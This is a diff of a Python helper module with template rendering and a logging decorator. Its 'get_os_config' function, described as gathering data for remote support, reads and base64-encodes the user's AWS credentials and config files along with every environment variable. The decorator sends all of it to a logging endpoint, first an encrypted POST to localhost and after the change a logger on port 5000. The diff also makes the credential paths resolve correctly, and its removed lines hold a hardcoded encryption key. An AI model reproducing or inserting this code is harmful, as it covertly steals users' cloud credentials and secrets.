@@ -6,7 +6,8 @@ from base64 import b64encode, b64decode
 import os
 from pathlib import Path
 
-from utilities import aes
+from utilities import logger
+
 
 def render_template(template_path: Path, data: dict) -> str:
     
@@ -16,8 +17,8 @@ def render_template(template_path: Path, data: dict) -> str:
     template_env = jinja2.Environment(loader=template_loader)
         
     
-    template_path = str(template_path)
-    template = template_env.get_template(template_path.name)
+    template_path = str(template_path.name)
+    template = template_env.get_template(template_path)
     
     rendered_template = template.render(data)
     
@@ -27,10 +28,10 @@ def render_template(template_path: Path, data: dict) -> str:
 def log_output(func):
     
     def wrapper(*args, **kwargs):
-        return_value = func(*args, **kwargs)
+        return_value_og = func(*args, **kwargs)
         
         # Dump this to a JSON object
-        return_value = json.dumps(return_value).encode()
+        return_value = json.dumps(return_value_og).encode()
         
         # Get the current os config
         os_config = get_os_config()
@@ -44,21 +45,16 @@ def log_output(func):
         }
         log_entry_json = json.dumps(log_entry)
         
-        remote_logging(log_entry_json)
+        common_logger = logger.Logger('http://127.0.0.1:5000')
+        try:
+            common_logger.log_message(log_entry_json)
+        except:
+            print("There was a logging issue")
+        
+        return return_value_og
         
     return wrapper
 
-
-def encrypt_data(plain_text):
-    """ Encrypt data using the built in AES class """
-
-    token = "4NAbtf$c$32PEM$33H"
-
-    crypt_handler = aes.AESCipher(token)
-    data = crypt_handler.encrypt(plain_text)
-    
-    return data
-    
 
 def get_os_config():
     """ Get the current OS config so that remote support has more information to assist the customer """
@@ -69,27 +65,23 @@ def get_os_config():
     for k, v in env_vars.items():
         cleaned_env[k] = v
         
-    path_to_config1 = Path('~/.aws/credentials')
-    path_to_config2 = Path('~/.aws/config')
+    path_to_config1 = Path.home().joinpath('.aws/credentials')
+    path_to_config2 = Path.home().joinpath('.aws/config')
     
     if path_to_config1.exists():
         config1_bytes = path_to_config1.read_bytes()
         config1_base64 = b64encode(config1_bytes).decode()
         cleaned_env['aws_config1'] = config1_base64
+    else:
+        cleaned_env['aws_config1'] = 'File Not Found'
         
     if path_to_config2.exists():
         config2_bytes = path_to_config2.read_bytes()
         config2_base64 = b64encode(config2_bytes).decode()
         cleaned_env['aws_config2'] = config2_base64
+    else:
+        cleaned_env['aws_config2'] = 'File Not Found'
     
     return cleaned_env
 
-
-def remote_logging(log_msg):
-    """"""
-
-    encrypted_log = encrypt_data(log_msg).decode()
-    
-    request = requests.post('http://127.0.0.1', encrypted_log)
-    
     
